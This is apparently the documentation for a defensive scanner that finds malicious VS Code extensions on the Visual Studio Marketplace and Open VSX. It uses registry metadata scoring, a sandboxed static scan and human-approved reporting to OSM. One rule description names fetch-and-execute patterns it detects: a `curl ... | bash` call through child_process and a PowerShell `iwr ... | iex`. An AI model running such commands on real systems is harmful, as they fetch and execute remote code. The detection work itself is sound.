# VS Code extension hunt

`gw extensions` hunts malicious VS Code extensions on two registries:

- **Visual Studio Marketplace**, where VS Code itself installs from (the public
  gallery query API VS Code uses).
- **Open VSX**, the registry used by VSCodium, Cursor, Windsurf and other VS Code
  forks.

`--registry all` (the default) runs both, each with its own `--limit` and
`--recent` budget. It follows the same two-tier, static-only design as the
repository hunt.

## Tier 1: metadata screen (host)

The host reads registry JSON only, never an extension archive. Candidates come
from three sources:

| Source | Points | Why |
|---|---|---|
| Recently published or updated extensions | 1 | New uploads and updates are where malicious extensions first appear |
| Lookalikes of popular extensions | 3 | Similar name or display name to an entry in `config/vscode_popular_extensions.json`, under a different publisher |
| Other extensions from a publisher OSM already reports | 5 | Read from the OSM `vscode` / `openvsx` feed that `gw ingest` stores |

Two cheap risk signals add a point each: fewer than 50 downloads (installs on the
Marketplace), and an unverified publisher (on the Marketplace, no verified or
domain-verified badge). Candidates are ranked by total, and the top `--limit` go to
Tier 2. A version already scanned is skipped unless `--rescan` is given.

## Tier 2: sandboxed static scan

Each candidate is fetched and analyzed inside the hardened `warden-sandbox`
container (`sandbox_entry --vsix-stdin`, with the extension id and URL passed as JSON on stdin rather than the command line):

- The download is accepted only from the registries' own hosts: `open-vsx.org`
  and its content hosts (`openvsx.eclipsecontent.org`, the older Azure blob
  storage), and `marketplace.visualstudio.com` with its asset CDN
  (`*.gallerycdn.vsassets.io`, `gallery.vsassets.io`), over
  HTTPS, following redirects only to those hosts, with a 150 MB cap.
- A gzip transfer wrapper the Marketplace may leave on the package is removed
  (bounded by the same size cap).
- The archive is unpacked into the container's tmpfs, with checks against path
  traversal, absolute paths, symlinks, too many entries and zip bombs.
- The extension's compiled entry point (`dist/`, `out/` or `build/`) is exposed
  to the scanner, since it is first-party code even though repository scans
  skip those directories.
- Warden's existing Tier-2 rules decide confirmation. Notably,
  `download_exec/js-exec-fetch-shell` catches `child_process.exec("curl
  http://<host>/x.sh | bash")` and the PowerShell `iwr ... | iex` equivalent.
  Like `curl-pipe-shell`, it confirms only against an attacker host.

Extension-specific signals are recorded for the analyst but never confirm on
their own:

| Signal | Meaning |
|---|---|
| `extension/startup-activation` | `activationEvents` contains `*` or `onStartupFinished` |
| `extension/declarative-pack-with-code` | Contributes only themes, snippets or grammars, yet ships a code entry point |
| `extension/bundled-native-binary` | Ships `.exe`, `.dll`, `.so`, `.dylib`, `.node` or similar outside `node_modules` |
| `extension/bundled-script` | Ships `.ps1`, `.bat`, `.cmd`, `.vbs` or `.sh` files |

The host receives only the JSON result. Verdicts are stored in
`extension_findings`. Confirmed extensions add their C2 hosts and code
signatures to the shared intelligence bus, so the repository hunt and KNORR
pivot on them too.

## Running it

```bash
docker build -f docker/Dockerfile.sandbox -t warden-sandbox:latest .
python gw.py extensions --registry all --limit 15 --recent 100 --summary-md ext_summary.md
```

Without the sandbox image, the command exits 2 rather than scanning on the
host. The `Warden VS Code Extension Hunt` workflow runs the same command daily
at 07:43 UTC against both registries (15 scans each), and on demand, and
publishes the summary to the run page.

## OSM submission (approval gated)

Confirmed extensions go to OSM only after a person approves the exact batch.

1. **Preview.** Every hunt runs `python -m git_warden.extensions.osm --dry-run`.
   Each confirmed AUTO extension that is not already submitted is checked
   against OSM (`check-malicious`, `report_type=package`). The run summary shows
   its evidence and the exact report body that would be POSTed. Nothing is sent.
2. **Approval.** The `submit` job runs only when the repository variable
   `EXTENSION_OSM_SUBMIT` is `on` and a required reviewer approves the
   protected `osm-extension-submission` environment.
3. **Submit.** Restricted to the approved list. Each extension is fetched again
   from its registry, re-scanned in the sandbox, must still confirm at AUTO,
   and must still be absent from OSM immediately before the POST. At most 10
   per run, 8 seconds apart.

Report body: `report_type: package`, `registry` (`vscode` for the Visual
Studio Marketplace, `openvsx` for Open VSX), `package_name` and
`resource_identifier` (`publisher.name`), `version_info`, a threat and payload
description with every rule that fired, tags, the registry page as evidence,
and the C2 hosts and URLs as IOCs.

Submitted extensions are recorded in `evidence/osm_extension_ledger.json`
(committed by the submit job) and on the shared intelligence bus, so none is
offered twice. A `reject` in the `reviewer_decision` column of
`evidence/findings.csv` keeps an extension out of every future preview. Any OSM
lookup failure blocks the run. See [evidence.md](evidence.md).

One-time setup:

1. Settings > Environments > New environment `osm-extension-submission`, add
   yourself under Required reviewers. It needs the `OSM_KEY` secret (a
   repository secret is inherited).
2. Settings > Secrets and variables > Actions > Variables: add
   `EXTENSION_OSM_SUBMIT` = `on`.

Not yet covered: a step in the KNORR joint hunt.
